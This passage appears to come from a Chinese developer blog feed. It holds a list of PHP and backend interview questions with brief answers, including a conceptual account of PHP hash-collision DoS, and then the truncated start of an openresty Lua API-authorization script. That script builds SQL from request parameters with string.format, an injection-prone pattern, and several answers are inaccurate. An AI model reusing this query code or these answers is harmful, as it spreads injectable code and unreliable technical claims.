 mc并发高，它是多线程的   </p></li><li>array_map() 的使用场景，array_merge(),合并数组之后的键名变换情况<br>  array_map() 为数组每一个元素应用回调函数<br>  array_merge() 数字键不会覆盖   字符串键会覆盖</li><li>php几个编码函数区别（json_encode, http_build_query, urlencode等区别）<br>  json_encode  把数组转成json<br>  http_build_query 数组转查询字符串<br>  urlencode url编码 -_.之外的都转换为%加连个数字空格转+号</li><li><p>正则表达式中 . * + / ? 的含义</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">? 0 个或1个</span><br><span class="line">* 表示0到多个</span><br><span class="line">+ 表示1到多个</span><br><span class="line">. 匹配除换行符外的所有单个的字符</span><br><span class="line">/ 定界</span><br></pre></td></tr></table></figure></li><li><p>给定一个数字，2进制转换成16进制<br>  <a href="http://www.cnblogs.com/gaizai/p/4233780.html#_labelConvert33" target="_blank" rel="noopener">http://www.cnblogs.com/gaizai/p/4233780.html#_labelConvert33</a></p></li><li><p>打印前一天的日期时间格式：2016.03.18 10:15:12，打印上个月的最后一天的日期</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> getPrevMonthFirstDay(<span class="variable">$date</span>) &#123; </span><br><span class="line">    <span class="built_in">return</span> date(<span class="string">'Y-m-d'</span>, strtotime(date(<span class="string">'Y-m-01'</span>, <span class="variable">$date</span>) . <span class="string">' -1 month'</span>)); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> getPrevMonthLastDay(<span class="variable">$date</span>) &#123; </span><br><span class="line">    <span class="built_in">return</span> date(<span class="string">'Y-m-d'</span>, strtotime(date(<span class="string">'Y-m-01'</span>, <span class="variable">$date</span>) . <span class="string">' -1 day'</span>)); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>PHP发送请求的方法，有什么不同点<br>  curl  file_get_content<br>  curl支持很多协议，有FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE以及LDAP，也就是说，它能做到很多file_get_content做不到的事情。curl在php可以实现远程获取和采集内容；实现PHP网页版的FTP上传下载；实现模拟登陆；实现接口对接（API），数据传输；实现模拟Cookie；下载文件断点续传等等，功能十分强大。<br>  首先需要在php.ini中开启该功能，即去掉 ;extension= php_curl.dll 前面的分号</p></li><li><p>写出10个mysql 的字段类型，说明使用场景</p></li><li><p>一个数据表，70个字段，10G的数据量，每天50w的数据增量，说出有哪些优化的方法<br>  拆字段<br>  10天一分区 或者 分表</p></li><li><p>写一个定时任务，每天2点到8点，每隔10分钟调用一次PHP脚本 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/10 2-8 * * * /data/www/test.php</span><br></pre></td></tr></table></figure></li><li><p>使用正则表达式判断ip的合法性，要考虑全面</p></li><li><p>redis中数据存储方式，各种数据结构应用的场景，redis做消息队列与专业的消息队列有什么区别和优势<br>  redis队列是轻量级的队列，不支持消息持久化</p></li><li><p>你对GO语言的理解，速度快吗？快在哪？</p></li><li><p>抓取 a.html页面，把含有a便签中的href全部抓取，如果url含有guazi.com就把该条url标题上guazi，然后再抓取该链接对应的页面，这样不断的遵化你抓取，你怎样解决死循环问题和页面抓取效率问题</p></li><li><p>一个日志文件，打印某一时刻的并发数（记录日志的条数）</p></li><li><p>一个数组按照固定的值排序(按照id排序)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a = [</span><br><span class="line">　　[&apos;abc&apos;] =&gt; [&apos;id&apos; =&gt; 1, &apos;value&apos; =&gt; 233],</span><br><span class="line">　　[&apos;bcd&apos;] =&gt; [&apos;id&apos; =&gt; 2, &apos;value&apos; =&gt; 463]</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li><li><p>数据库索引建立的原则</p></li><li><p>打印日志文件中，出现最多的前100个IP</p></li><li><p>php 和其他语言不同的地方，PHP中弱类型的实现</p></li><li><p>C语言中结构体和共用体的区别，每个占用做少内存（二者已给出）</p></li><li><p>有没有自己写的一些作品，或者开源的东西</p></li><li><p>秒杀怎么设计，注意点是什么</p></li><li><p>有没有学习新的东西，比如新的技术，语言</p></li><li><p>介绍一个最深刻的项目，说出技术点</p></li><li><p>coding：一个数组 0 - n-1，已经排好序，打印出满足 a[i]+a[j] = c 的所有i和j，说出时间复杂度</p></li><li><p>以后有什么打算，学习的目标或者是自己的规划目标</p></li><li><p>写一个类，一个单例类，输入两个数组，$arr1, $arr2，每个数组中存有整数（0-9）,这个类提供两个方法，一个是排序$arr1，一个是把两个数组当成两个大数然后进行相减，返回结果（第一个数组如果是[5, 2, 3, 4] ,相当于数字：5234）</p></li><li>数据库中两个笛卡尔积在join中的体现，说出left join的中间过程</li><li>网站打开慢的原因和解决办法</li><li><p>讲解项目的架构，redis在项目中的使用情况</p></li><li><p>数据库事务原理，是否使用过</p></li><li><p>数据库优化，索引建立原则</p></li><li><p>数据库事务的含义</p></li></ul><ul><li>框架使用，优缺点</li><li><p>是否使用过前端框架，js，jquery是否学习过</p></li><li><p>给两个数组得到交集，各自的差集</p></li><li><p>给两张表，得到各自的交集和差集</p></li><li>数据库索引的字段，哪些会用到索引，该怎样查看。</li><li>PHP短标签，怎样开启。结束标签有什么影响<br>  因为php只能运行在php标签里面的脚本，在脚本之外的所有字符，包括你看不见的空格或者回车，制表符号<br>  都是作为输出内容会response到客户端的。这样就有可能会产生意想不到的事情。比如说joyqi说的问题，<br>  不过这个还好问题不是很大，但是假如你在一个文件里面使用了header函数，这个文件同时又包含了另外一个文件<br>  并且被包含的文件的php标签外有空字符，这个时候会报header already send的错误。</li><li>div 怎样实现三栏式布局</li><li>php 各个框架的应用，php的安全相关</li><li>数据库的优化，怎样保证大数据量的数据库访问正常</li><li>数据库集群的特点和数据同步的机制</li><li>什么是响应式设计<br>  自适应不同屏幕大小。应用 CSS3 的媒体查询(Media Queries)，创建一个包含适应各种设备尺寸样式的<br>  CSS。一旦页面在特定的设备上加载，此时，会先检测设备的视口大小，然后加载特定于设备的样式。即为不同的媒体类型设<br>  定专有的样式表。</li><li><p>js闭包是什么？<br>  闭包就是能够读取其他函数内部变量的函数。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">f1</span></span>()&#123;</span><br><span class="line">　　　　var n=999;</span><br><span class="line">　　　　<span class="keyword">function</span> <span class="function"><span class="title">f2</span></span>()&#123;</span><br><span class="line">　　　　　　alert(n); </span><br><span class="line">　　　　&#125;</span><br><span class="line">　　　　<span class="built_in">return</span> f2;</span><br><span class="line">　　&#125;</span><br><span class="line">　　var result=f1();</span><br><span class="line">　　result(); // 999</span><br><span class="line">　　</span><br><span class="line">　　一个是前面提到的可以读取函数内部的变量</span><br><span class="line">　　另一个就是让这些变量的值始终保持在内存中。</span><br></pre></td></tr></table></figure></li><li><p>mysql与mysqli的区别有哪些？<br>  mysql扩展是最早的一套面向过程的api，支持功能相对比较少<br>  mysqli 是mysql的增强版，支持面向对象，各种新特性<br>  pdo是数据驱动层，把数据层和应用层隔离开</p></li><li><p>php多态是什么？<br>  多态是指在面向对象中能够根据使用类的上下文来重新定义或改变类的性质和行为。<br>  <a href="http://www.qttc.net/201208172.html" target="_blank" rel="noopener">http://www.qttc.net/201208172.html</a></p></li><li>http状态码:200、202、301、404、500<br>  网上一查一堆</li><li><p>memcache与mongoDB、Redis各自的使用场景是什么？<br>  参考: <a href="https://segmentfault.com/q/1010000002588088/a-1020000002589415" target="_blank" rel="noopener">https://segmentfault.com/q/1010000002588088/a-1020000002589415</a><br>  memcache多线程，数据结构简单，适合扛量，数据不可以持久化，不可以同步<br>  redis单线程，数据结构丰富，支持持久化，同步<br>  mongodb文档类型存储，适合存储集合类型的数据，如文章评论</p></li><li><p>1条微薄要推送给100万个粉丝该怎么处理？<br>  写队列中，根据数量（100万）动态调整消费者</p></li><li>假设给你5台机器，请大致的描述一下，如何使用你所熟悉的开源软件，搭建一个日PV 3万左右的中型网站<br>  前面2台nginx  中间一个cache   后面一主一从mysql</li><li>说说你所了解的搜索引擎包含那些技术？<pre><code>爬虫（采集）、切词（分词）、索引（存储）、查询以及其他相关技术</code></pre></li><li>使用过Memcache缓存吗，如果使用过，能够简单的描述一下它的工作原理吗？<pre><code>Memcahce是把所有的数据保存在内存当中，采用hash表的方式，每条数据又key和value组成，每个key是独一无二的，当要访问某个值的时候先按照找到值，然后返回结果。Memcahce采用LRU算法来逐渐把过期数据清除掉。</code></pre></li><li>原型链了不了解？<br>  <a href="http://www.cnblogs.com/shuiyi/p/5305435.html" target="_blank" rel="noopener">http://www.cnblogs.com/shuiyi/p/5305435.html</a></li><li><p>for与foreach哪个更快？<br>  foreach是通过GetEnumerator获得一个IEnumerator对象，通过IEnumerator对象执行MoveNext()方法和获取Current属性进行遍历的。<br>  由于Enumerator中，做了版本检查处理的工作，所以使用foreach是线程安全<br>  在一些全局的，多线程可以访问的数据结构对象，使用foreach。而对本地变量，则使用for，效率和安全兼顾！<br>  发现对于10W级以上的数组，foreach效率会更高，但对于1W级的数组，还是for效率高</p></li><li><p>表设计三大范式<br>  1．第一范式(确保每列保持原子性)</p><pre><code>所有字段值都是不可分解的原子值</code></pre><p>  2．第二范式(确保表中的每列都和主键相关)</p><pre><code>也就是说在一个数据库表中，一个表中只能保存一种数据，不可以把多种数据保存在同一张数据库表中。</code></pre><p>  3．第三范式(确保每列都和主键列直接相关,而不是间接相关)</p><pre><code>每一列数据都和主键直接相关，而不能间接相关。</code></pre></li><li><p>数据库设计经验,为什么进行分表? 分库?一般多少数据量开始分表? 分库? 分库分表的目的? 什么是数据库垂直拆分? 水平拆分? 分区等等？可以举例说明<br>  随着数据量增大首先考虑的是分库，按业务把相关模块的表放到一个库中。<br>  数据再大的时候就需要考虑分表（横向，纵向）<br>  分区主要是用于时间顺序明显的场景，比如日志</p></li><li><p>web开发方面会遇到哪些缓存? 分别如何优化?<br>  文件缓存，内存缓存，对象缓存</p></li><li><p>给你256M的内存,对10G的文件进行排序(文件每行1个数字),如何实现？对10G的文件进行查找如何实现？统计10G文件每个关键字出现的次数如何实现？</p></li><li><p>考察大文件处理  就是文件一下load到内存肯定不行 方法也就是分段读，具体实现也就是下面2中方法，没发现其他方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">方法一：生成器</span><br><span class="line">function getRows($file) &#123;</span><br><span class="line">    $handle = fopen($file, &apos;rb&apos;);</span><br><span class="line">    if ($handle === false) &#123;</span><br><span class="line">        throw new Exception();</span><br><span class="line">    &#125;</span><br><span class="line">    //feof()函数检测是否到达文件末尾</span><br><span class="line">    while (feof($handle) === false) &#123;</span><br><span class="line">        //fgetcsv()一次读取csv文件的一行</span><br><span class="line">        yield fgetcsv($handle);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose($handle)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach (getRows(&apos;data.csv&apos;) as $row) &#123;</span><br><span class="line">    print_r($row);</span><br><span class="line">&#125;</span><br><span class="line">方法二：文件指针</span><br></pre></td></tr></table></figure></li></ul><p>从你的经验方面谈一下如何构建高性能web站点? 需要哪些环节? 步骤? 每个步骤需要注意什么如何优化等?<br>    同上，具体场景具体分析。</p><ul><li>为什么要对数据库进行主从分离?<br>  因为顺序读写比随机读写快 </li><li><p>如何处理多服务器共享session?</p></li><li><p>存储session到memcache、redis中</p></li><li>一个10G的表,你用php程序统计某个字段出现的次数,思路是?</li><li>表指的是文件的话参考上面的生成器做法</li><li><p>表指的是数据库里的表的话 加上索引 一条SQL没啥问题</p></li><li><p>会告诉你一个nginx日志例子,用你认为最佳的编程语言统计一下http响应时间超过1秒的前10个url?</p></li><li><p>给你两个路径a和b,写一个算法或思路计算a和b差距几层并显示a和b的交集?</p></li><li><p>给你一个url,在nginx配置一下rewrite指定到某个具体路径?</p></li><li><p>一个php文件的解释过程是? 一般加速php有哪些?  提高php整体性能会用到哪些技术?</p></li><li><p>session和cookie生存周期区别? 存储位置区别?<br>session存储在服务器位置上，可以通过php.ini里面配置session相关配置<br>cookie存储在客户端上的上（其实可以分两种：<br>1，持久性cookie，设置了cookie的时间，以文件方式存在硬盘上，<br>2，会话cookie，没有设置cookie时间，cookie的生命周期也就是关闭浏览器前就消失，一般不会保存在硬盘，而是保存在内存上）</p></li><li><p>require、include、require_once、include_once区别? 加载区别? 如果程序按需加载某个php文件你如何实现?<br>包含的文件有错误<br>include()会产生一个警告，<br>require()则导致一个致命的错误（出现错误，脚本停止执行）<br>对include()语句来说，在执行文件时每次都要进行读取和评估；<br>include 产生一个 warning ，而 require 直接产生错误中断；<br>require 在运行前载入；<br>include 在运行时载入；<br>require_once 和 include_once 可以避免重复包含同一文件。</p></li><li><p>chrome号称为多线程的,所以多线程和多进程的区别为?<br>进程是资源分配最小单位<br>线程是cpu调度最下单位<br>同一进程下的线程共享内存数据</p></li><li><p>php在2011年底出现hash碰撞,hash碰撞原理为? 如何进行修复?<br><a href="http://blog.codinglabs.org/articles/hash-collisions-attack-on-php.html" target="_blank" rel="noopener">http://blog.codinglabs.org/articles/hash-collisions-attack-on-php.html</a></p></li><li><p>php是用单链表解决hash冲突的<br>原理: 哈希表碰撞攻击就是通过精心构造数据，使得所有数据全部碰撞，人为将哈希表变成一个退化的单链表，此时哈希表各种操作的时间均提升了一个数量级，因此会消耗大量CPU资源，导致系统无法快速响应请求，从而达到拒绝服务攻击（DoS）的目的。</p></li><li><p>POST攻击<br>当然，一般情况下很难遇到攻击者可以直接修改PHP代码的情况，但是攻击者仍可以通过一些方法间接构造哈希表来进行攻击。例如PHP会将接收到的HTTP POST请求中的数据构造为POST，而这是一个Array，内部就是通过Zend HashTable表示，因此攻击者只要构造一个含有大量碰撞key的post请求，就可以达到攻击的目的。具体做法不再演示。<br>POST攻击的防护<br>针对POST方式的哈希碰撞攻击，目前PHP的防护措施是控制POST数据的数量。在&gt;=PHP5.3.9的版本中增加了一个配置项max_input_vars，用于标识一次http请求最大接收的参数个数，默认为1000。因此PHP5.3.x的用户可以通过升级至5.3.9来避免哈希碰撞攻击。5.2.x的用户可以使用这个patch：<a href="http://www.laruence.com/2011/12/30/2440.html。" target="_blank" rel="noopener">http://www.laruence.com/2011/12/30/2440.html。</a><br>另外的防护方法是在Web服务器层面进行处理，例如限制http请求body的大小和参数的数量等，这个是现在用的最多的临时处理方案。具体做法与不同Web服务器相关，不再详述。<br>其它防护<br>上面的防护方法只是限制POST数据的数量，而不能彻底解决这个问题。例如，如果某个POST字段是一个json数据类型，会被PHP json_decode，那么只要构造一个超大的json攻击数据照样可以达到攻击目的。理论上，只要PHP代码中某处构造Array的数据依赖于外部输入，则都可能造成这个问题，因此彻底的解决方案要从Zend底层HashTable的实现动手。一般来说有两种方式，一是限制每个桶链表的最长长度；二是使用其它数据结构如红黑树取代链表组织碰撞哈希（并不解决哈希碰撞，只是减轻攻击影响，将N个数据的操作时间从O(N^2)降至O(NlogN)，代价是普通情况下接近O(1)的操作均变为O(logN)）。</p></li><li><p>web不安全因素有哪些? 分别如何防范?<br><a href="https://zhuanlan.zhihu.com/p/28821512" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/28821512</a><br>sql注入<br>xss<br>csrf   </p></li><li><p>假如两个单链表相交,写一个最优算法计算交点位置,说思路也可以?<br>  <a href="http://www.jianshu.com/p/9a953e4ad2cd" target="_blank" rel="noopener">http://www.jianshu.com/p/9a953e4ad2cd</a><br>  相交：俩单列表都包含同一个节点（不是节点值相同），那么交点之后的值肯定也是一样的了<br>  单列表无环：</p><pre><code>如果两条单链表相交，则将链表B，连接到链表A后面，如图所示（上面的链表是A，下面的链表是B），会形成环路，且链表B的表头一定在环上。因此我们只需要从链表B开始遍历，如果可以回到链表B的头结点，则说明两条链表相交。时间复杂度：O(len(A)+len(B))单链表相交，意味着相交结点具有相同的内存地址，且相交结点后的所有结点是两个链表共有的。因此如果两个链表相交，则最后一个节点肯定是相同的，因此只需要判断两个链表的最优一个节点是否相同。时间复杂度： O(len(A)+len(B))</code></pre></li><li><p>nginx负载均衡有哪些? 如果其中一台服务器挂掉,报警机制如何实现?</p></li><li><p>Nginx负载均衡有4种方案配置<br>  轮询 Round Robin，根据Nginx配置文件中的顺序，依次把客户端的Web请求分发到不同的后端服务器上<br>  最少连接 least_conn; Web请求会被转发到连接数最少的服务器上。<br>  IP地址哈希 ip_hash;<br>  基于权重 weight<br>  fair。这是比上面两个更加智能的负载均衡算法。此种算法可以依据页面大小和加载时间长短智能地进行负载均衡，也就是根据后端服务器的响应时间来分配请求，响应时间短的优先分配。Nginx本身是不支持fair的，如果需要使用这种调度算法，必须下载Nginx的upstream_fair模块。<br>  url_hash。此方法按访问url的hash结果来分配请求，使每个url定向到同一个后端服务器，可以进一步提高后端缓存服务器的效率。Nginx本身是不支持url_hash的，如果需要使用这种调度算法，必须安装Nginx 的hash软件包。</p></li><li><p>报警机制如何实现，实在不get不到考点，一般这种服务的原理就是俩机器之间有心跳检测，调度服务器收不到心跳就认为宕机就会被踢掉<br>可以引入监控平台如zabbix，能更好的监控。</p></li><li><p>nginx设置缓存js、css、图片等信息,缓存的实现原理是?</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">一：nginx作为源服务器</span><br><span class="line">    location ~* \.(?:jpg|jpeg|gif|png|ico|cur|gz|svg|svgz|mp4|ogg|ogv|webm|htc)$ &#123;</span><br><span class="line">      expires 1M;</span><br><span class="line">      access_log off;</span><br><span class="line">      add_header Cache-Control &quot;public&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    请求直接打到源服务器，会通过配置产生如下的响应头</span><br><span class="line">    HTTP/1.1 200 OK</span><br><span class="line">    Server: nginx/1.4.6 (Ubuntu)</span><br><span class="line">    Date: Fri, 05 Sep 2014 23:25:04 GMT</span><br><span class="line">    Content-Type: text/css</span><br><span class="line">    Last-Modified: Fri, 05 Sep 2014 22:46:39 GMT</span><br><span class="line">    Expires: Sat, 05 Sep 2015 23:25:04 GMT</span><br><span class="line">    Cache-Control: max-age=31536000  过期时间</span><br><span class="line">    Cache-Control: public   谁都可以缓存</span><br><span class="line"></span><br><span class="line">    二：nginx作为缓存服务器，在源服务器之前，类似于varnish，可以配置为单纯的转发，下面配置会解析源服务器响应并缓存</span><br><span class="line">    proxy_cache_path /tmp/nginx levels=1:2 keys_zone=my_zone:10m inactive=60m;</span><br><span class="line">    proxy_cache_key &quot;$scheme$request_method$host$request_uri&quot;;</span><br><span class="line">    </span><br><span class="line">    server &#123;</span><br><span class="line">        # Note that it&apos;s listening on port 80</span><br><span class="line">        listen 80 default_server;</span><br><span class="line">        root /var/www/;</span><br><span class="line">        index index.html index.htm;</span><br><span class="line">    </span><br><span class="line">        server_name example.com www.example.com;</span><br><span class="line">    </span><br><span class="line">        charset utf-8;</span><br><span class="line">    </span><br><span class="line">        location / &#123;</span><br><span class="line">            proxy_cache my_zone;</span><br><span class="line">            add_header X-Proxy-Cache $upstream_cache_status;</span><br><span class="line">    </span><br><span class="line">            include proxy_params;</span><br><span class="line">            proxy_pass http://172.17.0.18:9000;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p>如何提高缓存命中率? 如何对缓存进行颗粒化?<br>  细粒度，分层</p></li><li><p>php的内存回收机制是?<br>  5.3是引用计数，之后对引用计数做了优化，算法没看懂网上也没找到将明白的文章<br>  1、并不是每次refcount减少时都进入回收周期，只有根缓冲区满额后在开始垃圾回收。<br>  2、可以解决循环引用问题。<br>  3、可以总将内存泄露保持在一个阈值以下。</p></li><li><p>memcache magent 分布式设计？</p></li><li><p>redis 分布式设计，如何设计？</p></li><li><p>mongo 集群架构是怎样的？</p></li><li><p>闭包<br>各种专业文献上的”闭包”（closure）定义非常抽象，很难看懂。我的理解是，闭包就是能够读取其他函数内部变量的函数。<br>由于在Javascript语言中，只有函数内部的子函数才能读取局部变量，因此可以把闭包简单理解成”定义在一个函数内部的函数”。<br>所以，在本质上，闭包就是将函数内部和函数外部连接起来的一座桥梁。<br>闭包可以用在许多地方。它的最大用处有两个，一个是前面提到的可以读取函数内部的变量，另一个就是让这些变量的值始终保持在内存中。</p></li><li><p>PHP的MySQL扩展<br>设计开发允许PHP应用与MySQL数据库交互的早期扩展。mysql扩展提供了一个面向过程 的接口，<br>并且是针对MySQL4.1.3或更早版本设计的。因此，这个扩展虽然可以与MySQL4.1.3或更新的数<br>据库服务端 进行交互，但并不支持后期MySQL服务端提供的一些特性。</p></li><li><p>PHP的mysqli扩展<br>mysqli扩展，我们有时称之为MySQL增强扩展，可以用于使用 MySQL4.1.3或更新版本中新的高级特性。<br>mysqli扩展在PHP 5及以后版本中包含。<br>mysqli扩展有一系列的优势，相对于mysql扩展的提升主要有：<br>面向对象接口<br>prepared语句支持<br>多语句执行支持<br>事务支持<br>增强的调试能力<br>嵌入式服务支持</p></li><li><p>PHP数据对象(PDO)<br>PHP数据对象，是PHP应用中的一个数据库抽象层规范。PDO提供了一个统一的API接口可以<br>使得你的PHP应用不去关心具体要 连接的数据库服务器系统类型。也就是说，<br>如果你使用PDO的API，可以在任何需要的时候无缝切换数据库服务器</p><p>实战</p><p>百度<br>1.TCP三次握手</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.第一次握手：建立连接。客户端发送连接请求报文段，将SYN位置为1，Sequence Number为x；然后，客户端进入SYN_SEND状态，等待服务器的确认；</span><br><span class="line">2.第二次握手：服务器收到SYN报文段。服务器收到客户端的SYN报文段，需要对这个SYN报文段进行确认，设置Acknowledgment Number为x+1(Sequence Number+1)；同时，自己自己还要发送SYN请求信息，将SYN位置为1，Sequence Number为y；服务器端将上述所有信息放到一个报文段（即SYN+ACK报文段）中，一并发送给客户端，此时服务器进入SYN_RECV状态；</span><br><span class="line">3.第三次握手：客户端收到服务器的SYN+ACK报文段。然后将Acknowledgment Number设置为y+1，向服务器发送ACK报文段，这个报文段发送完毕以后，客户端和服务器端都进入ESTABLISHED状态，完成TCP三次握手。</span><br><span class="line">完成了三次握手，客户端和服务器端就可以开始传送数据。以上就是TCP三次握手的总体介绍。</span><br></pre></td></tr></table></figure><p>2.设计模式<br>3.DDOS攻击和防范<br>4.php-fpm和fastcgi<br>5.项目亮点以及优化<br>腾讯<br>1.二分查找<br>2.项目框架<br>3.高并发和高可用技术选型<br>4.数组互换<br>5.静态变量和局部静态变量<br>6.数据库类型和索引结构</p></li></ul>]]></content>
      
      <categories>
          
          <category> 经验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> job </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>lua鉴权</title>
      <link href="/nginx-lua.html"/>
      <url>/nginx-lua.html</url>
      <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>openresty+lua做接口调用权限限制<br>说明：openresty可以理解为一个服务器它将nginx的核心包含了过来，并结合lua脚本语言实现一些对性能要求高的功能</p><h3 id="purview-lua"><a href="#purview-lua" class="headerlink" title="purview.lua"></a>purview.lua</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">--调用json公共组件</span><br><span class="line">cjson = require(<span class="string">"cjson"</span>)</span><br><span class="line">fun = require(<span class="string">"myxz.fun"</span>) -- 引用公用方法文件</span><br><span class="line">conf = require(<span class="string">"myxz.ini"</span>) --引用配置文件</span><br><span class="line">reds = require(<span class="string">"myxz.redis_pool"</span>) --引用redis连接池</span><br><span class="line">mysqld = require(<span class="string">"myxz.mysql_pool"</span>) --引用mysql连接池</span><br><span class="line">--参数校验</span><br><span class="line">check_arg =   fun:check_post_arg() --调用参数校验方法</span><br><span class="line">arg_tables = &#123;&#125; --存储post的参数信息</span><br><span class="line"><span class="keyword">if</span> check_arg[<span class="string">'status'</span>] ==0 <span class="keyword">then</span></span><br><span class="line">    --参数校验通过，获取返回的参数，并将参数拼接</span><br><span class="line">    arg_tables= check_arg[<span class="string">'arg_tables'</span>]</span><br><span class="line">    get_info = string.format(<span class="string">"%s:%s:%s"</span>,arg_tables[<span class="string">'appid'</span>],arg_tables[<span class="string">'ip'</span>],arg_tables[<span class="string">'appkey'</span>])</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    ngx.say(fun:resJson(-1,check_arg[<span class="string">'msg'</span>]))</span><br><span class="line">    <span class="built_in">return</span>;</span><br><span class="line">end</span><br><span class="line"> </span><br><span class="line">--1.首先通过redis查找</span><br><span class="line">--2.没有找到再找数据库</span><br><span class="line">--3.根据appid查询项目是否授权</span><br><span class="line">--4.项目获取权限成功，再查询ip是否被限制了</span><br><span class="line"><span class="built_in">local</span> res,err,value = reds:get_key(get_info)</span><br><span class="line"><span class="keyword">if</span> not res <span class="keyword">then</span></span><br><span class="line">    ngx.say(fun:resJson(-1,err))</span><br><span class="line">    <span class="built_in">return</span></span><br><span class="line">end</span><br><span class="line"><span class="keyword">if</span> value == ngx.null <span class="keyword">then</span></span><br><span class="line">      </span><br><span class="line">    --redis数据未空,根据appid查询，查询信息是否一致</span><br><span class="line">    <span class="built_in">local</span> sql_appid =  string.format(<span class="string">"select * from myxz_appid_list   where appid= '%s' and appkey='%s'   limit 1 "</span>,arg_tables[<span class="string">'appid'</span>],arg_tables[<span class="string">'appkey'</span>])  </span><br><span class="line">    <span class="built_in">local</span> res,msg,result = mysqld:query(sql_appid)</span><br><span class="line">    --连接失败报错</span><br><span class="line">    <span class="keyword">if</span> not res <span class="keyword">then</span></span><br><span class="line">        ngx.say(fun:resJson(-1,msg))</span><br><span class="line">    end</span><br><span class="line">      </span><br><span class="line">    --未查找数据报错</span><br><span class="line">    <span class="keyword">if</span> table.maxn(result)== 0 <span class="keyword">then</span></span><br><span class="line">        ngx.say(fun:resJson(-1,<span class="string">'appid验证失败，被拦截'</span>))</span><br><span class="line">        <span class="built_in">return</span></span><br><span class="line">    end</span><br><span class="line"> </span><br><span class="line">    --项目权限获取成功，需要验证ip是否被允许</span><br><span class="line">    <span class="built_in">local</span> sql = string.format(<span class="string">"select * from myxz_appid_white_list where appid='%s' and ip= '%s' limit 1 "</span>,arg_tables[<span class="string">'appid'</span>],arg_tables[<span class="string">'ip'</span>])</span><br><span class="line">    res,msg,result = mysqld:query(sql)</span><br><span class="line">    <span class="keyword">if</span> table.maxn(result)==0 <span 